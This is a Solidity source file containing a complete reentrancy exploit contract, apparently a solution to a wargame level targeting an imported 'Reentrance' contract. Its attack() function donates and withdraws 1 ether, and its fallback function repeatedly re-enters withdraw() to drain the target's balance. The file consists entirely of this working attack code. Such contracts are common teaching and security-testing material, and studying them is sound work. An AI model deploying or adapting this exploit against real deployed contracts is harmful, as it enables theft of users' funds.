// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrancy.sol';

contract ReentranceAttacker {
    Reentrance public etherStore;

    constructor(address payable _etherStoreAddress) public {
        etherStore = Reentrance(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.donate{value: 1 ether}(address(this));
        etherStore.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}